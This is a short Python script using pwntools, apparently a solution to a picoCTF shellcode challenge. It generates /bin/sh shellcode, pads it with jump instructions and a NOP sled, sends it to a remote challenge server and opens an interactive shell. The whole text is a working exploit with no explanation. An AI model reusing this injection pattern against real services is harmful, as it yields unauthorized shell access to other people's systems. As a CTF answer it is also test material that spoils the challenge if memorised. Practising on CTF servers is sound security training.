from pwn import *

context.log_level = "debug"

shellcode = shellcraft.sh()
payload = asm("jmp $+0x60 ; " + shellcode + "nop ; " * 20 + "jmp $+0x51 ;")
p = remote("mercury.picoctf.net", 35338)
p.sendlineafter("Give me code to run:\n", payload)
p.interactive()